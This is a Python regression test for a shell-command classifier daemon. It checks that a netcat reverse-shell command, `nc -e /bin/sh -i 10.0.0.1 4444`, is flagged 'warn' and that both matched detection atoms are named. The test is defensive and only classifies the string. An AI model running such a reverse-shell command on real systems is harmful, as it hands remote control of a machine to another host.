#!/usr/bin/env python3
"""71-sigma-reverse-shell — `nc -e /bin/sh -i` shape replay.

Pins that the canonical Sigma-shape reverse-shell command
`nc -e /bin/sh -i 10.0.0.1 4444` classifies as warn (two atoms
combine to ~0.84 confidence — see 40-auto-block for the math)
with reason text naming both atom matches.

A regression where atom_matcher.rs lost source-tagged
attribution (Sigma vs GTFOBins vs bundled) or where the
reason renderer collapsed two atom hits into a count instead
of naming them would surface here, distinct from the unit-test
coverage in atty-guard/src/atom_matcher.rs.

Failure modes this catches:
- Atom corpus prune that removed `nc -e` OR `/bin/sh -i` from
  the bundled set (one-atom match drops to Safe by the >=2
  signals guard).
- Reason rendering regression where multi-atom hits show a
  count instead of the atom strings.
- classify path skipping atom evaluation for nc-shaped lines.
"""
from __future__ import annotations

import sys

sys.path.insert(0, "/sandbox")
from lib.daemon import Daemon  # noqa: E402
from lib.uds import call  # noqa: E402


PROBE_CMD = "nc -e /bin/sh -i 10.0.0.1 4444"


def fail(msg: str) -> None:
    print(f"FAIL: {msg}", file=sys.stderr)
    sys.exit(1)


def main() -> None:
    with Daemon(verbosity=1) as d:
        resp = call("classify", command=PROBE_CMD)
        if resp.get("type") != "classify":
            d.dump_log()
            fail(f"classify failed: {resp}")
        verdict = resp.get("verdict")
        # Default verdict is warn — two atoms combine to ~0.84
        # confidence, AND `[accumulator] block_threshold` isn't
        # set in this scenario. Allowing block would mask a
        # regression where the opt-in gate fails open.
        # 40-auto-block covers the threshold-enabled block path.
        if verdict != "warn":
            d.dump_log()
            fail(f"expected warn (no [accumulator] block_threshold "
                 f"opt-in) on Sigma-shape multi-atom hit, got "
                 f"verdict={verdict!r}; full response: {resp}")
        reason = resp.get("reason", "")
        # Both atom fragments must appear in the rendered reason.
        # A regression that collapsed multi-atom reasons to "N
        # signals fired" without naming the atoms would drop both.
        missing = [a for a in ("nc -e", "/bin/sh -i") if a not in reason]
        if missing:
            d.dump_log()
            fail(f"reason text missing atom(s) {missing!r}; "
                 f"reason={reason!r}; full response: {resp}")

    print("PASS: 71-sigma-reverse-shell")


if __name__ == "__main__":
    main()
